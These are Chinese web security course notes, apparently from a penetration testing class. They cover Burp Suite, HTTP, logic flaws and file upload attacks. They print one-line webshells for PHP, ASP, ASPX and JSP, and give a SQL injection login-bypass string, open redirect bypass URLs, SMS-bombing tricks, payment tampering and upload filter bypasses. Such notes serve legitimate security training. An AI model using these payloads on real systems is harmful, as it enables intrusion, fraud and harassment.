<p>课程笔记：<br>常用模块<br>Target：显示目标的目录结构<br>Proxy：拦截模块，拦截的包都在这里，可以选择拦截的开启，关闭，丢包，放行，可以将这里拦截的包，右键–发送到需要的模块<br>Spider：用于爬虫，爬取内容和功能<br>Scanner：扫描web应用的漏洞<br>Intruder：主要用来模糊测试、xss、sqli、暴力破解</p>
<p><img src="/source/hetian/image-20210202190315073.png" alt="image-20210202190315073"></p>
<p>Repeater：重放模块，分析web的响应<br>Decoder：编码、解码<br>Compare：对两个包进行比对，寻找不同<br>Extender:用于加载拓展的模块<br>Options：burpsuit的一些设置</p>
<p>易错点<br>1、在加载字典时，无论是paste或者load之前，都应清空列表里已有的数据，它并不能自动清除，若未清除，则会叠加，会增加字典的长度</p>
<p><img src="/source/hetian/image-20210202190338645.png" alt="image-20210202190338645"></p>
<p>2、怎么找到正确的账号密码（结果）？<br>并不是简单的点击长度排序就行了，一般正确的包状态码可以是200/302/301，并且包的长度是唯一的，明显和其他包不同。</p>
<h2 id="2、http、https协议介绍"><a href="#2、http、https协议介绍" class="headerlink" title="2、http、https协议介绍"></a>2、http、https协议介绍</h2><p>预习笔记：<br>1、访问<a target="_blank" rel="noopener" href="http://www.baidu.com的流程/">www.baidu.com的流程</a><br>首先浏览器向dns服务器解析域名对应的ip，然后通过该ip访问该域名对应的web服务器，此时就是通过三次握手进行数据的交互</p>
<p>2、请求方法<br>Get请求<br>Post请求</p>
<p>3、状态码<br>200请求成功<br>301：资源原本存在，但是现在被永久性的转移到其他地方了<br>302：资源原本存在，但是现在被临时性的转移到其他地方了<br>400语法错误<br>401未经授权<br>403拒绝服务<br>404请求资源不存在<br>500内部服务器错误</p>
<p>4、get和post的区别<br>Get请求的数据在地址栏里显示，地址栏改变；<br>Post请求的数据在http的包里面，地址栏不会改变；</p>
<p>5、http是无连接的：每次连接只处理一个请求，即处理完用户的请求和应答后，就会断开连接</p>
<p>6、http是无状态的：比如每次都需要在包里发送cookie，因为它是没有记忆功能的</p>
<p>7、请求消息的组成：请求行、请求头、空行、请求数据</p>
<p>8、相应消息的组成：状态行、消息报头、空行、响应正文</p>
<p>9、Get、post、http详解<br>http是基于tcp传输数据的，tcp就相当于汽车，但是全部都一样的汽车会造成会造成混乱，所以就有了交通规则http，规定进行post请求就需要给汽车贴上post标签，其他请求同理。并且规定，get请求需要将货物放在车顶，post需要将货物放在车厢内。<br>同时，互联网中还有各个运输公司（浏览器、web服务器），他们也制定了标准，对url的长度也就是运送货物的重量进行了限制，浏览器大都限制url为2k个字节，而web服务器最多处理64k大小的url，那么超过的部分怎么处理？一般都不处理。<br>并且get是发送一个包，而post是发送2个包，相当于get是直达的，而post在正式运输货物之前会和web服务器打个招呼，然后才开始运输货物，表面看起来get比post更有效，但实际上这多一个包所导致的时间几乎可以忽略不计，并且post在包的完整性方面，更加的有优势。</p>
<p>课程笔记：<br>三次握手：主要是用来建立连接<br>浏览器：我请求建立连接（第一次握手）<br>web服务器：你的请求我已经收到了，你的请求有效，我同意建立进行连接，接下来我将建立连接了（第二次握手）<br>浏览器：ok，我收到了你的信息了（第三次握手）</p>
<p>四次挥手：主要是用来释放连接<br>浏览器：我请求释放连接（第一次挥手）<br>web服务器：你的请求我已经收到了，请求有效（第二次挥手）<br>web服务器：最后再提醒你一下，我即将释放掉连接（第三次挥手）<br>浏览器：好的，谢谢啦，我知道了（第四次挥手）</p>
<p>Url的组成</p>
<p><img src="/source/hetian/image-20210202191129372.png" alt="image-20210202191129372"></p>
<p>URI<br>URI由URN和URL组成，所以所有的URL都是URI，但是并不是所有的URI都是URL<br>URN举例：<br>Tel:+1-816-555-1212</p>
<p>http请求和http响应的组成</p>
<p><img src="/source/hetian/image-20210202191150346.png" alt="image-20210202191150346"></p>
<p>X-Forwarded-For</p>
<p>X-Forwarded-For的作用就是服务器来获取客户端的真实ip的，无论客户端是否使用代理，都会通过X-Forwarded-For回查到真实ip，这是因为在我们通过代理服务器时，服务器会自动给我们的请求头里加上X-Forwarded-For：我们的ip  ，后面如果还有代理，会在该X-Forwarded-For后面新增ip，然后就导致服务器可以通过这条关系追查到我们的真实ip，这样一些需要内部ip才能访问的服务我们就不能访问了。<br>解决办法就是，我们在初次发包的时候，就构造一个虚假的X-Forwarded-For：虚假ip，该虚假ip可以根据你所针对的内部网页需要的ip来设置。<br>此题：我抓包后，发送到repeater并发送，发现页面提示：this page only accept come from localhost   意思就是该页面仅仅支持内部的本地ip访问</p>
<p><img src="/source/hetian/image-20210202191358638.png" alt="image-20210202191358638"></p>
<p>所以我们可以通过构造一个本地的ip：127.0.0.1来绕过<br>在包下面添加   X-Forwarded-For:127.0.0.1    然后发送，发现成功进入</p>
<p><img src="/source/hetian/image-20210202191409174.png" alt="image-20210202191409174"></p>
<p><img src="/source/hetian/image-20210202191414505.png" alt="image-20210202191414505"></p>
<p>https：相当于http的安全版<br>https的优缺点<br>优点：传输的数据是加密的，增加了中间人攻击的成本，可以防止数据被窃取和修改，保证了数据的完整性，还可以防止流量劫持；<br>缺点：用到的证书是收费的；费时，打开页面变慢；消耗cpu和内存资源多</p>
<p>Cookie和session<br>Cookie：由服务器生成，存储在浏览器里<br>内存cookie：浏览器关闭就会清空<br>硬盘cookie：存储在硬盘中，有个过期的时间，除非用户手工清理或者该cookie过期了才会无法使用<br>Cookie的缺点：cookie会附加在每个http请求中，增加了流量；同时http请求中的cookie是明文传输的，所以存在安全问题（使用https可以避免）；cooke有大小限制，限制为4kb左右，所以无法用来存储大量的数据</p>
<p>Cookie的生成与存储</p>
<p>当我们访问一个网站，浏览器会查找是否有该网站的cookie，有就将其附加到本次的http请求头中，服务器会根据我们请求头里的cookie来响应你的请求；但是如果是初次访问一个网站，我们也就没有该网站的cookie，所以这第1次请求中，将不会附加cookie，当服务器接收到这条没有cookie的请求后，将会发给浏览器一个响应，其中响应头里有个参数set_cookie，当我们的浏览器接收到该响应的时候，就会根据该响应头中的set-cookie设置，将cookie储存在浏览器中。此时如果我们再次访问该网站，那么这次请求中就会附加cookie<br>总结：修改cookie的前提是请求包中有cookie才能修改，不要自己去新增，若请求中没有cookie，刷新一下浏览器，重新抓包后就有了，然后再修改cookie</p>
<p>Session<br>由服务端生成，并储存在服务端，安全</p>
<p>Put请求：对服务器文件进行新增或修改<br>作用：利用put方法，我们可以在对方的文件夹下传入恶意文件，例如一句话木马，或者修改对方网页的内容<br>易错点：<br>1、首先，put方法并不是从我们的本地计算机上传一个文件，而是通过在请求包里插入请求数据，写入put新增的文件里去，来达到变相的上传或修改<br>2、其次，写入数据需要和请求体中间空一行<br>未修改前：</p>
<p><img src="/source/hetian/image-20210202191649923.png" alt="image-20210202191649923"></p>
<p>通过PUT修改该页面的内容</p>
<p><img src="/source/hetian/image-20210202191658089.png" alt="image-20210202191658089"></p>
<p>访问刚刚上传的1.txt，即：<a target="_blank" rel="noopener" href="http://39.108.86.16/upload/1.txt">http://39.108.86.16/upload/1.txt</a></p>
<p><img src="/source/hetian/image-20210202191710682.png" alt="image-20210202191710682"></p>
<h1 id="第三章：逻辑漏洞（logic-loophole）"><a href="#第三章：逻辑漏洞（logic-loophole）" class="headerlink" title="第三章：逻辑漏洞（logic loophole）"></a>第三章：逻辑漏洞（logic loophole）</h1><p>特点：逻辑漏洞用合法的方式来达到破坏的效果，比如密<br>码找回，用户登录验证等功能由于程序设计的不足，这一类<br>漏洞一般的防护手段或者设备无法阻止，漏洞扫描器也难以发现</p>
<h2 id="1、url跳转漏洞"><a href="#1、url跳转漏洞" class="headerlink" title="1、url跳转漏洞"></a>1、url跳转漏洞</h2><p>实际意义：构造好url后，完全可以发送给其他人，让他们点击</p>
<p>预习笔记：<br>1、url跳转漏洞有多种绕过方式，当我们发现一个存在跳转的页面时，除了正常测试，还可以用下绕过的方法：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/94377">https://www.anquanke.com/post/id/94377</a><br>2、当我们使用点分十进制ip来进行跳转，却发现无用时，可以将其转换为纯十进制来实现绕过，在线转换地址：<a target="_blank" rel="noopener" href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
<p><img src="/source/hetian/image-20210202192136652.png" alt="image-20210202192136652"></p>
<p>Url跳转漏洞利用：<br>首先是得寻找到这些跳转的地方，一般是登录，分享、收藏，或者超链接跳转等地方<br>接下来就是直接将跳转链接换成自己的，看行不行，不行就使用绕过的方法进行测试，？ @ # 斜杠、反斜杠、双斜杠、白名单，点分十进制ip转换等方法进行测试。</p>
<p>课程笔记：<br>Url跳转漏洞也被称为重定向漏洞<br>Url跳转漏洞的实际应用场景：<br>1、钓鱼<br>2、Xss<br>3、Csrf<br>4、配合其他漏洞进行综合应用</p>
<p>Url跳转漏洞存在的常见参数：<br>redirect<br>redirect_to<br>redirect_url<br>url<br>jump<br>jump_to<br>target<br>to<br>link<br>linkto<br>Domain</p>
<p>Url漏洞绕过的方法：<br>url 跳转有时候会做一些限制绕过 bypass，这里baidu.com假设为我们自己的页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 利用问号绕过限制：url=https://www.baidu.com?www.xxxx.me2. 利用@绕过限制：url=https://www.baidu.com@www.xxxx.me3. 利用斜杠反斜杠绕过限制：url=http://www.evil.com/www.xxxx.me4. 利用#绕过限制：https://www.baidu.com#www.xxxx.me5. 利用子域名绕过：https://www.baidu.com.xxx.com6. 利用畸形url绕过：https://xxxx.me/redirect.php?url=http://www.evil.com\.xxxx.me7. 利用跳转ip绕过：https://www.ipaddressguide.com/ip8. 利用xip.io绕过 http://www.qq.com.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>









<h2 id="2、短信轰炸漏洞"><a href="#2、短信轰炸漏洞" class="headerlink" title="2、短信轰炸漏洞"></a>2、短信轰炸漏洞</h2><p>产生原因：没有对短信的使用时间和短信的发送频率做限制<br>原理：抓到服务器发送短信的包，然后抓包，进行不停的重放<br>绕过技巧：<br>1.尝试在 mobile 参数后面加 %20 即空格</p>
<ol start="2">
<li><p>尝试在 mobile 后面加字母等</p>
</li>
<li><p>尝试对参数进行多次叠加</p>
</li>
<li><p>利用调用接口绕过短信 &amp; 邮箱轰炸限制<br>比如这样的参数：terminal=01&amp;Mobile=XXXXXXX，前面的接口是调用短信发送内容的接口，比terminal 参数值为 01 是调用注册成功的短信提示，02 是调用密码重置成功的短信提示，03 调用注册成功的短信提示等等当修改这个接口值时也就达到了短信轰炸或邮箱轰炸的目</p>
</li>
<li><p>修改 Cookie 值绕过短信 &amp; 邮箱轰炸限制<br>有些可能不是直接验证手机号来判断次数，而是验证当前 Cookie，利用当前 Cookie 来进行验证发送次数的话，很容易造成绕过，如果验证的不是登录状态的 Cookie 而是普通状态下的Cookie的话就可以通过修改 Cookie 达到绕过验证。</p>
</li>
<li><p>修改 IP 绕过短信 &amp; 邮箱轰炸限制<br>有些同样是验证当前 IP 的，如果当前 IP 短时间内获取短信或邮件频繁或者达到一定次数的话就会出现限制，那么就可以利用修改 IP 或者代理 IP 来进行绕过限制。</p>
</li>
<li><p>利用大小写绕过邮箱轰炸限制<br>前面说到了关于加空格的绕过限制，邮箱也可以用，但还有一种方式可以绕过邮箱轰炸限制，那就是通过修改大小写，通过修改邮箱后面字母的大小写就可绕过限制，比如参数是这样的：email=<a href="mailto:&#120;&#x78;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#120;&#x78;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a> 当次数达到限制时，随便修改一个字母为大写：email=<a href="mailto:&#x78;&#x78;&#64;&#81;&#113;&#x2e;&#x63;&#111;&#109;">&#x78;&#x78;&#64;&#81;&#113;&#x2e;&#x63;&#111;&#109;</a> 就可绕过限制</p>
</li>
<li><p>修改返回值绕过短信 &amp; 邮箱轰炸<br>比如发送成功后返回值是 success，发送失败的返回值是 error，那么当达到次数后，可以通过修改返回值为正确的返回值：success，从而绕过限制，达到发送成功的目的。</p>
</li>
</ol>
<h2 id="3、任意密码修改漏洞"><a href="#3、任意密码修改漏洞" class="headerlink" title="3、任意密码修改漏洞"></a>3、任意密码修改漏洞</h2><p>课程内容：<br>漏洞场景：<br>1.验证码可爆破<br>表现：验证码四位，服务端未对验证时间次数进行限制（出现次数较多）<br>表现：验证码六位，但是不过期（时间很久），并且没有对验证的次数进行限制<br>表现：验证码可以发送多次，而且每次都不会过期<br>利用：使用 burp 的爆破模块，或者自己编写脚本<br>修复：使用六位验证码，限制验证码认证次数<br>2.验证码回传<br>重置密码时，凭证为发送到手机上的验证码，但是通过拦截发送验证码请求对应的 Response包时，发现验证码在 Response 包中。</p>
<p>具体表现：</p>
<p>解决方案：修改包的返回规则<br>重点：注意是凭证，有时候返回包中凭证可能在 cookie 里面，也有可能在其他地方。<br>示例：dedecms 任意密码重置</p>
<p>3.验证码未绑定用户<br>输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证。<br>表现：任意账号都能够接收到验证码并能够使用A手机的验证码，B可以拿来用<br>4.用户混淆</p>
<p>5.本地验证绕过</p>
<p>客户端在本地验证验证码是否正确，而该判断结果也可以在本地修改，最终导致欺骗<br>客户端，误以为我们已经输入了正确的验证码场景：<br>1.验证码返回在前台进行对比<br>2.验证码在 js 里面直接进行对比<br>3.直接修改返回包</p>
<ol start="6">
<li>跳过验证步骤<br>成因：对修改密码的步骤，没有做校验，导致可以输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。<br>测试：首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录输入新密码的对应链接。重置他人用户时，获取验证码后，直接进入输入新密码对应链接到新密码的界面，输入密码重置成功</li>
</ol>
<p>7、token 可预测<br>成因：使用邮件接受重置密码的链接时，一般都会带有一个 token 用于判断该链接是否被修改过。如果 token 可以预测，那么攻击者可以通过构造链接来重置任意的用户密码。<br>表现：<br>1.基于时间戳生成的 token<br>2.基于递增序号生成的 token<br>3.基于关键字段生成的 token<br>4.token 有规律<br>8、 同时向多个账户发送凭证<br>表现：将发送验证码的包截获，修改字段添加多个账户，再发包。发现所写的有效字段均发送了凭证<br>9、接收端可篡改<br>重置密码时，凭证会发送到手机上，通过替换手机号，可以使用自己的手机号接受验证码</p>
<p>10、万能验证码<br>这是可遇不可求的奇葩场景，某些开发在未上线前为了方便测试加了 888888、000000 这样的万能验证码但是上线后没去删除测试的内容，导致被恶意利用。</p>
<h2 id="4、任意用户登录漏洞"><a href="#4、任意用户登录漏洞" class="headerlink" title="4、任意用户登录漏洞"></a>4、任意用户登录漏洞</h2><p>适用场景<br>1.手机登录验证码回显<br>跟任意密码修改漏洞类似…….在手机验证码登录的时候有一个验证码回显直接用验证码登录<br>2.修改返回包可以登录<br>案例：U 付钱包客户端任意用户登录</p>
<ol>
<li><p>首先在重置或者登录的时候抓登录包</p>
</li>
<li><p>然后修改返回包，把错误的变成正确的</p>
</li>
<li><p>服务器被欺骗，登录成功</p>
</li>
<li><p>通过遍历 id 可以登录<br>通过修改对应的 userid 号，利用修改其他的 userid 进行登录。<br>实例：vlcms_1.2.0 任意用户登录</p>
</li>
<li><p>首先注册账号</p>
</li>
<li><p>访问地址：</p>
</li>
</ol>
<pre><code>http://127.0.0.1/vlcms/index.php?s=/member/res_login/post：uid=60
</code></pre>
<ol start="3">
<li><p>修改 uid 登录任意用户</p>
</li>
<li><p>sql 注入万能密码</p>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理：select id from users where username = &#x27;admin&#x27; or 1=1 #&#x27; and password = &#x27;&#x27;.......利用 sql 注入语句 admin&#x27; or 1=1 #组合语句</span><br></pre></td></tr></table></figure>

<p>  6.系统默认弱口令<br>  系统在搭建的时候，设置了默认口令。例如 123456 等这种密码，或者是默认的强口令，asfaqwezcz1231 这种，但是密码是通用的就可以利用这个密码进行登录任意账户（经常出现某些国企，公司，学校等单位）</p>
<p>  7.撞库<br>  不同的系统有可能会用一个相同的数据库，例如 4A 的统一认证，拿到了一个系统的数据库用户即可通用，或者旧密码未改动，可以通过社工库等查询到旧密码，进行撞库。</p>
<p>  8.cookie 混淆<br>  在登录的时候是根据cookie 中的某一个字段来进行判断登录的角色，这个cookie 的字段可以自己任意修改，最常见的就是userid 字段。</p>
<h2 id="5、越权漏洞"><a href="#5、越权漏洞" class="headerlink" title="5、越权漏洞"></a>5、越权漏洞</h2><p>越权访问漏洞，又可以分为横向越权访问漏洞与纵向越权访问漏洞两类。一般是指一个正常用户 A 可以操作另外一个用户 B 才能做的事情。</p>
<p>产生原因：越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。</p>
<p>平行越权：通俗说，就是用户A可以查看修改用户B的一些数据。在发送请求时观察请求参数，尝试修改用户 id 或者其他参数验证是否能查看不属于自己的数据，进行增删改查，若成功则存在平行越权的漏洞</p>
<p>垂直越权：主要体现在登录的时候，拦截普通用户的登录请求，然后将其中的代表身份的标识改为admin或者其他用户的标识，就可以实现垂直越权，在发送请求时观察请求参数，尝试修改用户 id 或者其他参数验证是否能查看不属于自己的数据，进行增删改查，若成功则存在平行越权的漏洞</p>
<p>越权漏洞的利用<br>流程：<br>抓包修改id</p>
<p>重点：明白每个参数的作用，再根据参数来寻找越权</p>
<p>技巧：<br>一个站里面很多包的参数命名可能是通用的，或者变化不大的，寻找包里的身份验证参数，然后修改</p>
<p>易忽视点：一些id并不是只能在我登录该账户才能看到，实际上，评论里也会有其他用户的一些身份id，当我们在一个有很多评论的页面，刷新页面并抓包，会发现这些评论的用户的身份标识都出来了</p>
<h2 id="6、支付逻辑漏洞"><a href="#6、支付逻辑漏洞" class="headerlink" title="6、支付逻辑漏洞"></a>6、支付逻辑漏洞</h2><p>常见的漏洞<br>1、修改商品的价格<br>原因：价格写在前端了，并且没有对商品价格进行验证<br>解决方法：将商品价格写在数据库，并添加商品价格的验证</p>
<p>2、修改商品的数量为-1<br>原因：未对传入的商品数量进行判断<br>特点：可以实现给我们的账户加钱<br>解决方法：在传入的商品数量进行判断，对于小于1的直接按1算</p>
<p>3、用低价的商品的价格购买高价格的商品<br>原因：对商品的编号未加密，<br>解决方法：修复方案:<br>     1.对于传递重要的参数信息应当加密隐藏<br>     2.传递多个参数之间应当检测数据的一致性</p>
<p>4、修改支付的状态<br>商品购买成功后，在商户（第三方支付平台）跳转到购物平台之前，通过repeater重放，可以实现一次付费，购买多次的效果</p>
<p>5、修改优惠券</p>
<p>6、其他类型<br>修改支付接口：比如一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接口值不一样，如果逻辑设计不当，当我随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果没做好不存在接口相关处理，那么此时就会支付成功<br>重复支付：类似试用卷，你试用完成或者主动取消试用时，试用卷会返回到账户当中<br>最大额支付：在设置的时候，商城的支付金额有上限，当输入 9999999999999 类似的一个超大数<br>的时候，可能会存在溢出，或者直接变为 0</p>
<p>7、条件竞争漏洞<br>条件竞争应用场景：<br>同时发包获取优惠卷等，可以绕过限制的次数</p>
<p>条件竞争利用到了多线程请求和逻辑上的错误，假设我购买A，A价值100元账户有100元，系统会先判断我的钱够不够，如果够，那么就可以购买成功，但是如果此时使用多线程，再加上网络延迟的影响，在上次购买时系统查询余额的时候，我开始了第二次购买，接着系统又开始第二次查询余额，漏洞即将爆发，此时如果第二次查询因为网络好，延迟低，结果在第一次查询之前就查到，那么实际上我的余额还是100，这时我的第二次购买就会成功，好吧，我们的主角上场了，第一次的查询总算查询成功，余额100元，所以第一次购买也就姗姗来迟的购买成功了，这就是用100元购买了2件A，本来只能买一件的。</p>
<p>上传文件，拿webshell<br>场景：很多服务端在处理一个上传的文件时a.php时，会将其临时储存在一个目录temp，接着再将该文件移动到上传专用目录upload，此时该文件在upload的文件名还是a.php，紧接着程序会将a.php重命名为a.jpg或者其合法的后缀。<br>漏洞利用点：我们就是要在a.php刚刚移动到upload目录的时候，访问到a.php，那么a.php因为被我们访问了，所以相当于被占用了，也就无法被重命名了，此时我们就可以getshell<br>时机的把握：我们首先拦截一个请求包，然后将其发送到intruder，清除变量，在x-forward的ip那里进行修改，将最后一个数字改成变量，然后加载数字字典，设置最小1，最大10001，也就是重复发包1000次，然后多线程也设置好。这样不停的请求，我们再在另外一个浏览器不停地访问图片的地址（upload下的地址），不停的刷新，总有一次会访问成功</p>
<p><img src="/source/hetian/image-20210202204624648.png" alt="image-20210202204624648"></p>
<p><img src="/source/hetian/image-20210202204632045.png" alt="image-20210202204632045"></p>
<p><img src="/source/hetian/image-20210202204637366.png" alt="image-20210202204637366"></p>
<p><img src="/source/hetian/image-20210202204644541.png" alt="image-20210202204644541"></p>
<p><img src="/source/hetian/image-20210202204650300.png" alt="image-20210202204650300"></p>
<h1 id="第四章：文件上传漏洞"><a href="#第四章：文件上传漏洞" class="headerlink" title="第四章：文件上传漏洞"></a>第四章：文件上传漏洞</h1><h2 id="1、Webshell"><a href="#1、Webshell" class="headerlink" title="1、Webshell"></a>1、Webshell</h2><ol>
<li>根据文件大小分类：<br>一句话木马：代码简短，通常只有一行代码，使用方便<br>小马：只包含文件上传功能，体积小<br>大马：体积大，包含很多功能，代码通常会进行加密隐藏</li>
<li>根据脚本类型分类：<br>Jsp、asp、aspx、php</li>
</ol>
<p>Webshell的特点：webshell一般不会在系统日志中留下记录，只会在web日志中留下数据传递记录</p>
<p>Webshell攻击流程：</p>
<ol>
<li>利用web漏洞获取web权限</li>
<li>上传小马</li>
<li>上传大马</li>
<li>远程调用webshell执行命令</li>
</ol>
<p>Webshell一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP：易错点：<span class="keyword">eval</span>前面的@符号可有可无，其次中括号里面的单引号也是可有可无<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[pass]);<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[pass]);<span class="meta">?&gt;</span>       ASP：&lt;%<span class="keyword">eval</span> request(“pass”)%&gt;    ASPX：&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>])%&gt;    JSP：&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure>

<p>易错点：<br>1、该实验中，最后自己安装phpstudy进行试验，有一点别忘记了，phpstudy的服务记得开启哈<br>2、一句话木马：<?php @eval($_POST['a']);?>     这里的@不能少，并且小括号里的是美元符号$而不是&amp;，同时分号是在小括号外面的，这几个关键点都不能错</p>
<p>Webshell基本原理</p>
<ol>
<li>可执行脚本<br>eval:将字符串按照php代码执行</li>
<li>数据传递<br>HTTP数据包($_GET、$_POST、$_COOKIES)</li>
</ol>
<p>常见的php Webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET方式：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[pass]);<span class="meta">?&gt;</span>    POST方式：<span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[pass]);<span class="meta">?&gt;</span>    Cookie：<span class="meta">&lt;?php</span> @<span class="variable">$a</span> = <span class="variable">$_COOKIE</span>[<span class="number">1</span>];@assert(<span class="variable">$a</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>怎么调用一句话木马？<br>1、菜刀等webshell工具连接<br>2、通过浏览器执行相关命令<br>1&gt;如果是get方式的木马（一句话木马里的内容是get）<br>地址栏访问该木马文件，然后加上   ？a=phpinfo();<br>如：<a target="_blank" rel="noopener" href="http://www.baidu.com/1.php?a=phpinfo()">www.baidu.com/1.php?a=phpinfo()</a>;<br>这里的1.php就是木马文件，而a就相当于木马文件里的变量a，a=phpinfo();相当于将语句phpinfo();  传到木马文件里的变量里，然后执行<br>2&gt;如果是post方式的木马，则通过hackbar的方式 post数据</p>
<p><img src="/source/hetian/image-20210202205318371.png" alt="image-20210202205318371"></p>
<p>3&gt;如果是cookie方式的木马，则通过设置cookie的方式来执行相关命令，这里cookie的名称是cookie，值为：变量名=命令，例如如果木马文件里的变量是a，则cookie的值可以为：a=phpinfo();</p>
<p><img src="/source/hetian/image-20210202205333422.png" alt="image-20210202205333422"></p>
<p>一句话木马、小马、大马三者之间的依存关系<br>一句话木马的使命就是用来载入小马的代码的，打个比方，我们可以通过一句话木马给其内部变量传递命令，那么如果将这个命令改为小马的代码，因为小马的代码内容就是在网站创建一个文件，让后给该文件写入内容，内容可以构造一个上传页面，所以我们接着可以访问该新创建的上传页面，然后就可以上传大马了，大马功能更多，各种骚操作</p>
<p><img src="/source/hetian/image-20210202205346039.png" alt="image-20210202205346039"></p>
<h2 id="2、webshell管理"><a href="#2、webshell管理" class="headerlink" title="2、webshell管理"></a>2、webshell管理</h2><p>预习内容：<br>1、查壳</p>
<p><img src="/source/hetian/image-20210202205438036.png" alt="image-20210202205438036"></p>
<p><img src="/source/hetian/image-20210202205443240.png" alt="image-20210202205443240"></p>
<p>2、脱壳<br>在upx软件目录，按住shift+右键，打开命令行窗口，然后执行：upx.exe -d xx/xx/caidao.exe</p>
<p><img src="/source/hetian/image-20210202205457517.png" alt="image-20210202205457517"></p>
<p>然后再次查看是否有壳，此时发现没有</p>
<p><img src="/source/hetian/image-20210202205532232.png" alt="image-20210202205532232"></p>
<p>3、查看软件的字符串<br>在strings.exe的目录下打开命令窗口，然后执行:strings.exe  xx/xx/caidao.exe</p>
<p><img src="/source/hetian/image-20210202205543057.png" alt="image-20210202205543057"></p>
<p>4、查看字符串里制定的内容<br>通过 3查看的内容， 发现太多，所以可以通过在3后面的命令加上搜索命令来查看指定内容<br>添加：|findstr 关键字<br>这里查看http的内容</p>
<p><img src="/source/hetian/image-20210202205602885.png" alt="image-20210202205602885"></p>
<p>这里查看chopper的内容</p>
<p><img src="/source/hetian/image-20210202205614598.png" alt="image-20210202205614598"></p>
<p>怎么分析菜刀里是否有后门？<br>抓取菜刀这个软件的包，先进行url解码，然后进行base64解码，如果还需要解码，那么该菜刀很可能有后门，当最终解码成功后，如果发现包的内容里包含其他网址，那么这就是后门了，使用burp解码的时候需要选择右边的decode as</p>
<p><img src="/source/hetian/image-20210202205652407.png" alt="image-20210202205652407"></p>
<p>几款管理工具<br>1、中国菜刀（caidao）<br>官网：<a target="_blank" rel="noopener" href="http://www.maicaidao.co/">http://www.maicaidao.co/</a></p>
<p>2、c刀（cknife）<br><a target="_blank" rel="noopener" href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
<p>3、Weevely3<br><a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
<p>4、中国蚁剑（AntSword）<br>AntSword 加载器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a><br>AntSword 源码：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<p>5、冰蝎（Behinder）<br>下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip</a><br>使用介绍：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
<p>怎么在菜刀执行post命令？<br>1、先连接上webshell，然后再菜刀webshell列表页面，选中需要的webshell，然后右键—-浏览网站—-地址栏输入webshell的地址—点击右边的小方框来显示post框</p>
<p><img src="/source/hetian/image-20210202205741051.png" alt="image-20210202205741051"></p>
<p><img src="/source/hetian/image-20210202205806445.png" alt="image-20210202205806445"></p>
<p><img src="/source/hetian/image-20210202205810170.png" alt="image-20210202205810170"></p>
<h2 id="3、上传绕过技巧-实战"><a href="#3、上传绕过技巧-实战" class="headerlink" title="3、上传绕过技巧/实战"></a>3、上传绕过技巧/实战</h2><p>预习内容：<br>预习的内容，共有2个实验，一个是直接上传，一个是检测mime类型，直接通过burp修改mime类型即可</p>
<p>课程内容：</p>
<p>上传漏洞产生的原因：<br>1、服务器配置不当<br>2、开源编辑器的上传漏洞<br>3、文件解析漏洞导致文件执行（比如apache、iis解析漏洞）<br>4、文件上传限制被绕过<br>5、过滤不严格，导致被绕过</p>
<p>文件上传检测方式及绕过方法<br>1、客户端的检测（浏览器）<br>客户端javascript检测（检测文件扩展名）<br>绕过的2种方法：<br>①禁用js<br>②先上传符合要求的文件，然后抓包修改后缀名。比如先在本地将php文件后缀修改为jpg，然后上传–抓包–再将后缀名改回php</p>
<p>2、服务端的检测<br>服务端mime类型检测（检测content-type内容）<br>绕过方法：<br>在burp里，将content-type字段的内容修改为符合条件的，常见的mime类型如下：<br>超文本标记语言.html文件：text/html<br>普通文本.txt文件：text/plain<br>PDF文档.pdf：application/pdf<br>Microsoft Word文件.word：application/msword<br>PNG图像.png：image/png<br>GIF图像.gif：image/gif<br>MPEG文件.mpg、.mpeg：video/mpeg<br>AVI文件.avi：video/x-msvideo<br>服务端目录路径检测（检测跟path参数相关的内容）</p>
<p>服务端文件扩展名检测（检测跟文件extennsion相关的内容，通俗的说就是服务端设置了黑名单和白名单）</p>
